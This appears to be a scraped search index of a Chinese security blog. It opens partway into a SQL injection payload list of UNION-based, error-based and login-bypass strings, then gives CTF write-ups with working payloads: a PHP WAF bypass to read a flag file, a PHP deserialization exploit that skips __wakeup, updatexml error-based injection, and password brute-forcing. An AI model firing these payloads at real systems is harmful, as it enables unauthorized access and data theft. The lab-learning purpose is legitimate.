CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\nAND 3516&#x3D;CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516&#x3D;3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\nAND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523&#x3D;4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\nUNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nUNION ALL SELECT &#39;INJ&#39;||&#39;ECT&#39;||&#39;XXX&#39;,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n\n\n\n0x05 SQL 注入身份验证绕过有效负载&#39;-&#39;\n&#39; &#39;\n&#39;&amp;&#39;\n&#39;^&#39;\n&#39;*&#39;\n&#39; or &#39;&#39;-&#39;\n&#39; or &#39;&#39; &#39;\n&#39; or &#39;&#39;&amp;&#39;\n&#39; or &#39;&#39;^&#39;\n&#39; or &#39;&#39;*&#39;\n&quot;-&quot;\n&quot; &quot;\n&quot;&amp;&quot;\n&quot;^&quot;\n&quot;*&quot;\n&quot; or &quot;&quot;-&quot;\n&quot; or &quot;&quot; &quot;\n&quot; or &quot;&quot;&amp;&quot;\n&quot; or &quot;&quot;^&quot;\n&quot; or &quot;&quot;*&quot;\nor true--\n&quot; or true--\n&#39; or true--\n&quot;) or true--\n&#39;) or true--\n&#39; or &#39;x&#39;&#x3D;&#39;x\n&#39;) or (&#39;x&#39;)&#x3D;(&#39;x\n&#39;)) or ((&#39;x&#39;))&#x3D;((&#39;x\n&quot; or &quot;x&quot;&#x3D;&quot;x\n&quot;) or (&quot;x&quot;)&#x3D;(&quot;x\n&quot;)) or ((&quot;x&quot;))&#x3D;((&quot;x\nor 1&#x3D;1\nor 1&#x3D;1--\nor 1&#x3D;1#\nor 1&#x3D;1&#x2F;*\nadmin&#39; --\nadmin&#39; #\nadmin&#39;&#x2F;*\nadmin&#39; or &#39;1&#39;&#x3D;&#39;1\nadmin&#39; or &#39;1&#39;&#x3D;&#39;1&#39;--\nadmin&#39; or &#39;1&#39;&#x3D;&#39;1&#39;#\nadmin&#39; or &#39;1&#39;&#x3D;&#39;1&#39;&#x2F;*\nadmin&#39;or 1&#x3D;1 or &#39;&#39;&#x3D;&#39;\nadmin&#39; or 1&#x3D;1\nadmin&#39; or 1&#x3D;1--\nadmin&#39; or 1&#x3D;1#\nadmin&#39; or 1&#x3D;1&#x2F;*\nadmin&#39;) or (&#39;1&#39;&#x3D;&#39;1\nadmin&#39;) or (&#39;1&#39;&#x3D;&#39;1&#39;--\nadmin&#39;) or (&#39;1&#39;&#x3D;&#39;1&#39;#\nadmin&#39;) or (&#39;1&#39;&#x3D;&#39;1&#39;&#x2F;*\nadmin&#39;) or &#39;1&#39;&#x3D;&#39;1\nadmin&#39;) or &#39;1&#39;&#x3D;&#39;1&#39;--\nadmin&#39;) or &#39;1&#39;&#x3D;&#39;1&#39;#\nadmin&#39;) or &#39;1&#39;&#x3D;&#39;1&#39;&#x2F;*\n1234 &#39; AND 1&#x3D;0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055\nadmin&quot; --\nadmin&quot; #\nadmin&quot;&#x2F;*\nadmin&quot; or &quot;1&quot;&#x3D;&quot;1\nadmin&quot; or &quot;1&quot;&#x3D;&quot;1&quot;--\nadmin&quot; or &quot;1&quot;&#x3D;&quot;1&quot;#\nadmin&quot; or &quot;1&quot;&#x3D;&quot;1&quot;&#x2F;*\nadmin&quot;or 1&#x3D;1 or &quot;&quot;&#x3D;&quot;\nadmin&quot; or 1&#x3D;1\nadmin&quot; or 1&#x3D;1--\nadmin&quot; or 1&#x3D;1#\nadmin&quot; or 1&#x3D;1&#x2F;*\nadmin&quot;) or (&quot;1&quot;&#x3D;&quot;1\nadmin&quot;) or (&quot;1&quot;&#x3D;&quot;1&quot;--\nadmin&quot;) or (&quot;1&quot;&#x3D;&quot;1&quot;#\nadmin&quot;) or (&quot;1&quot;&#x3D;&quot;1&quot;&#x2F;*\nadmin&quot;) or &quot;1&quot;&#x3D;&quot;1\nadmin&quot;) or &quot;1&quot;&#x3D;&quot;1&quot;--\nadmin&quot;) or &quot;1&quot;&#x3D;&quot;1&quot;#\nadmin&quot;) or &quot;1&quot;&#x3D;&quot;1&quot;&#x2F;*\n1234 &quot; AND 1&#x3D;0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055\n\n","slug":"SQL注入Payload汇总","date":"2022-09-03T00:22:57.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"86385108ea30f567fcdfebd7ea538d02","title":"BUU-[RoarCTF2019]Easy-Calc","content":"0x00BUU一道PHP解析特性题目。\n0x01 原理原理1：利用PHP的字符串解析特性\n参考文章：https://www.freebuf.com/articles/web/213359.html\n\n\n\n\n\n\n\n\n\nPHP将查询字符串（在URL或正文中）转换为内部$_GET或关联数组$_POST。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如：&#x2F;?foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。&#x2F;? foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个空格&#x2F;?+foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个+号\n\n原理2：利用scandir()列出目录和文件,var_dump()用于输出\n\n\n\n\n\n\n\n\n\nscandir()函数返回指定目录中的文件和目录的数组。scandir(/)相当于ls /var_dump()相当于echo\n原理3：利用file_get_contents()读取并输出文件内容\n\n\n\n\n\n\n\n\n\nfile_get_contents(/flag.php)，读取/flag.php的代码\n0x02 访问靶场给出一个计算器，随便测试一下看源码：\n\n\n\n告诉设置了一个WAF来确保安全，并且给了calc.php文件。\n0x03先访问calc.php文件：\n给出了源码；大概意思就算是使用GET方式传入一个num，并且对num的进行黑名单过滤，最后eval()执行。\n0x04num传入字符：\n\n看到直接被禁止访问，说明第一个源码给的WAf起作用了。\n传入数字：\n0x05\n\n\n\n\n\n\n\n\n说明在解析calc.php?num&#x3D;xxx时会检测num的值是否是数字，那这里利用原理1：PHP的字符串解析特性：在num前加入干扰字符，使WAF检测时候检测不到num值即可绕过WAF，但是php在解析时会去掉干扰字符，继续正常执行，最终达到上传非法字符的目的。\n在?和num之间加入空格，上传字符a，成功执行：\n\n接下来利用原理2读取目录：\n? num&#x3D;var_dump(scandir(chr(47)))相当于? num&#x3D;system(ls &#x2F;) #\tchr(47)&#x3D;&quot; &#x2F; &quot;\n\n\n\n找到flag所在文件名，利用原理3读文件内容：\n? num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))\n&#x3D;&#x3D;&gt;&gt;file_get_contents(&#x2F;f1agg)相当于? num&#x3D;system(cat &#x2F;f1agg)\n\n\n\n\n\n\n\n\n\n\n这里&#x2F;&#x3D;chr(47)，f&#x3D;chr(102)，l&#x3D;chr(49)，a&#x3D;chr(97)，g&#x3D;chr(103)，g&#x3D;chr(103)来进行绕过\n\n\n拿到flag。\n","slug":"BUU-RoarCTF2019-Easy-Calc","date":"2022-07-24T01:50:42.000Z","categories_index":"CTF","tags_index":"CTF,代码审计,PHP","author_index":"Aurora"},{"id":"03b1766a9dfb129451d74c3a9e2dbdc8","title":"BUU-[极客大挑战2019]PHP","content":"0x00BUU一道PHP反序列化题目。\n0x01 访问靶场打开靶场，提示有备份网站的好习惯，猜测有备份网站的文件\n\n直接扫目录得到www.zip文件，解压：\n0x02 代码审计查看index.php和class.php这两个主文件即可：\nindex.php：\ninclude 'class.php';\n$select = $_GET['select'];\n$res=unserialize(@$select);\n?>\n\n看到unserialize()函数，应该存在反序列化漏洞。\nclass.php：\n&lt;?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name&#123;\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password)&#123;\n        $this->username = $username;\n        $this->password = $password;\n    &#125;\n\n    function __wakeup()&#123;\n        $this->username = 'guest';\n    &#125;\n\n    function __destruct()&#123;\n        if ($this->password != 100) &#123;\n            echo \"&lt;/br>NO!!!hacker!!!&lt;/br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"&lt;/br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"&lt;/br>\";\n            die();\n        &#125;\n        if ($this->username === 'admin') &#123;\n            global $flag;\n            echo $flag;\n        &#125;else&#123;\n            echo \"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!\";\n            die();\n\n            \n        &#125;\n    &#125;\n&#125;\n?>\n\n看到class.php文件就可以确定是有类的反序列化题目了。\n只要username&#x3D;&#x3D;&#x3D;’admin’即可输出flag。\n0x03 常用的内置方法涉及函数：\n_construct()：创建对象时初始化，当一个对象创建时被调用\n_wakeup() 使用unserialize时触发\n_sleep() 使用serialize时触发\n_destruction()：结束时销毁对象，当一个对象销毁时被调用\n\n\n\n0x04 构造payload&lt;?php\n\nclass Name&#123;\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password)&#123;\n        $this->username = $username;\n        $this->password = $password;\n    &#125;\n&#125;\n$a = new Name('admin',100);\n$b = serialize($a);\necho $b;\n?>\n\n构造payload时候按照class类中的格式照抄，不要进行修改，否则会出错，由于最终需要使$username&#x3D;&#x3D;&#x3D;’admin’，声明Name对象时候直接传参即可，最后再进行序列化即可。\n\nO:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\n输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）。\n\n\n\n\n\n\n\n\n\n这里尝试将private修改为public，但最后得到的payload拿不到flag，会出错，只能使用private进行构造。\n之后还需要绕过_wakeup方法：\n在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 _wakeup()函数的执行\n原payload：O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n绕过：O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;\n\n之后需要还需要将输出的不可见字符变为%00：\n?select&#x3D;O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;\n\n\n\n拿到flag。\n0x05 总结1、构造payload的时类中的字段原样构造，不要修改其原数据（自己构造payload的时踩的坑）\n2、绕过_wakeup()方法：在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 _wakeup()函数的执行\n3、private声明时最后的不可见字符，在构造payload的时需要编码为%00\n","slug":"BUU-极客大挑战2019-PHP","date":"2022-07-23T15:25:34.000Z","categories_index":"反序列化","tags_index":"反序列化,PHP","author_index":"Aurora"},{"id":"fc23abf567ea93cff7f9b201441e8d7a","title":"BUU-HardSQL","content":"0x00BUU一到SQL注入题目。\n0x01打开靶场：\n\n先试试万能密码：\n这里应该是把空格过滤了，测试一下：\n\n输入admin’ ‘，还是返回同样的页面：\n\n\n使用括号替换空格发现出现报错，没有出现那几个汉字，证明确实过滤了空格：\n\n\n\n\n\n\n\n\n\n\n空格绕过原理：\n括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格。\n0x02这里使用报错注入试试：\nadmin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n\n\n\n爆出数据库。\n查表时候遇到=也被过滤了：\n\n\n那这里就是用like进行绕过。\n继续查表：\nadmin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#\n\n\n查列名：\nadmin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#\n\n\n查flag：\nadmin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#\n\n\n只拿到一般flag；另一半使用right构造payload：\n（这里由于是得到一般flag，一般可以使用substring和mid来截取，但是这两个字段也被过滤了，使用right或者left进行替换绕过）\nadmin&#39;or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))#\n\n\n得到flag{da8a8535-7969-4874-9ab7-63496c6970ad}\n0x03 总结\n\n\n\n\n\n\n\n\n1：空格被过滤可以使用&#x2F;**&#x2F;或者()绕过2：&#x3D;号被过滤可以用like来绕过3：substring与mid被过滤可以用right与left来绕过\n\n\n\n\n\n\n\n\n\n空格绕过原理：\n括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格。\n","slug":"BUU-HardSQL","date":"2022-07-22T11:29:37.000Z","categories_index":"SQL注入","tags_index":"CTF,SQL注入","author_index":"Aurora"},{"id":"dbee8267c0ff772e8e935645576bc24d","title":"Bugku-bp","content":"0x00Bugku一道弱口令爆破题目，比平时的爆破略微有些不同。\n0x01打开靶场，提示使用弱口令top1000，而且应该是z开头的六位密码：\n\n\n0x02从网上下载好top1000弱口令字典直接使用bp设置好参数进行爆破：\n\n0x03\n观察长度都一样，没有任何一个不同，这就是与平时爆破不同的地方；\n无非两种情况：1、正确的密码不在字典当中；\n2、正确的密码在已使用的密码字典中，但是不论输入的密码是否正确，Response的长度都是908\n不管使用什么字典，都是908；\n查看返回包看看有什么不同：\n每一条回应包都有一段这样的JS代码，提示密码错误，这里可以猜想，正确的回应包应该和现在的回应包有所不同。二者之间的差异应该就在这段JS代码当中。\nJS代码中声明了var r = &#123;code: &#39;bugku10000&#39;&#125;这样一个变量，若是r.code等于bugku10000就返回密码错误，否则就返回正确。\n既然报错返回包中会有&#123;code: &#39;bugku10000&#39;&#125;此字段，那就将此字段放入爆破模块进行匹配，返回不同结果则表示为正确的密码。\n这时需要用到Intruder中的Grep-Match功能：\n\n该功能可以帮我们分析Response中是否含有给定字符串。\n0x04继续爆破，不过此时就不是观察长度来判断，而是观察所加入的字段来判断：\n观察&#123;code: &#39;bugku10000&#39;&#125;字段，看到其他密码都被打了☑，只有最有一个没有，尝试登录：\n得到flag。\n0x05再观察对应返回包：\n正确返回包返回的是hacker1000\n\n错误返回包返回的还是bugku10000\n\n0x06 总结与平时爆破不同的是这次观察的不是长度，这也说明，可能有时进行爆破密码正确也不一定能够直接观察出来，还需要查看回显数据包进行进一步检测，需要配合回显数据包的数据进行密码爆破。关注点有时可能并不是一个，而是多个。\n","slug":"Bugku-bp","date":"2022-07-22T02:21:04.000Z","categories_index":"CTF","tags_index":"CTF","author_index":"Aurora"},{"id":"b677a8964f78654f7fae8209041bf9e6","title":"BUU-WarmUp","content":"0x00BUU，Web题目WarmUp，PHP代码审计。\n0x01打开靶场只有一个表情包：\n\n查看源码发现source.php文件，直接访问：\n\n\n出现源代码。\n看到源码中存在一个hint.php文件，直接访问：\n提示flag在ffffllllaaaagggg当中，告诉了flag的文件位置。\n0x02直接代码审计：\n&lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    &#123;\n        public static function checkFile(&amp;$page)\n        &#123;\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) &#123;\n                echo \"you can't see it\";\n                return false;\n            &#125;\n\n            if (in_array($page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n            echo \"you can't see it\";\n            return false;\n        &#125;\n    &#125;\n\n    if (! empty($_REQUEST['file'])\n        &amp;&amp; is_string($_REQUEST['file'])\n        &amp;&amp; emmm::checkFile($_REQUEST['file'])\n    ) &#123;\n        include $_REQUEST['file'];\n        exit;\n    &#125; else &#123;\n        echo \"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    &#125;  \n?>\n\n先分析非类部分：\nif (! empty($_REQUEST['file'])\n       &amp;&amp; 